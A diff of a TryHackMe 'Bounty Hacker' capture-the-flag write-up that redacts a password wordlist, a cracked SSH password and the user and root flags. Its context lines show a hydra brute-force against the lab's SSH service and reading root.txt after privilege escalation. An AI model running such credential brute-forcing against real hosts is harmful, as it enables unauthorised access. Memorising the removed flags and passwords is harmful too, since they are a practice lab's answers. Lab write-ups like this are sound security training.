@@ -150,32 +150,7 @@ Here we grabbed the files that were sitting on the FTP server now that they are 
 
     ┌──(root💀kali)-[/home/kali/bounty]
     └─# cat locks.txt 
-    rEddrAGON
-    ReDdr4g0nSynd!cat3
-    Dr@gOn$yn9icat3
-    R3DDr46ONSYndIC@Te
-    ReddRA60N
-    R3dDrag0nSynd1c4te
-    dRa6oN5YNDiCATE
-    ReDDR4g0n5ynDIc4te
-    R3Dr4gOn2044
-    RedDr4gonSynd1cat3
-    R3dDRaG0Nsynd1c@T3
-    Synd1c4teDr@g0n
-    reddRAg0N
-    REddRaG0N5yNdIc47e
-    Dra6oN$yndIC@t3
-    4L1mi6H71StHeB357
-    rEDdragOn$ynd1c473
-    DrAgoN5ynD1cATE
-    ReDdrag0n$ynd1cate
-    Dr@gOn$yND1C4Te
-    RedDr@gonSyn9ic47e
-    REd$yNdIc47e
-    dr@goN5YNd1c@73
-    rEDdrAGOnSyNDiCat3
-    r3ddr@g0N
-    ReDSynd1ca7e
+  {{redacted}}
 
     ┌──(root💀kali)-[/home/kali/bounty]
     └─# cat task.txt  
@@ -194,7 +169,7 @@ Looks like the first one is a potential password list for us to use. The second 
         [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
         [DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
         [DATA] attacking ssh://10.10.85.238:22/
-        [22][ssh] host: 10.10.85.238   login: lin   password: RedDr4gonSynd1cat3
+        [22][ssh] host: 10.10.85.238   login: lin   password: {{redacted}}
 
 -l = single user name to use
 
@@ -209,7 +184,7 @@ We were able to get valid login credentials for the ssh port so lets pop on and 
         lin@bountyhacker:~/Desktop$ ls
         user.txt
         lin@bountyhacker:~/Desktop$ cat user.txt
-        THM{CR1M3_SyNd1C4T3}
+        {{redacted}}
 
         lin@bountyhacker:~/Desktop$ sudo -l
         [sudo] password for lin: 
@@ -240,7 +215,7 @@ Alright so we got the user.txt flag and using the sudo -l command we can see tha
         -rw-r--r--  1 root root   66 Jun  7  2020 .selected_editor
         drwx------  2 root root 4096 Jun  7  2020 .ssh
         # cat root.txt
-        THM{80UN7Y_h4cK3r}
+        {{redacted}}
 
 
 This was a nice quick box
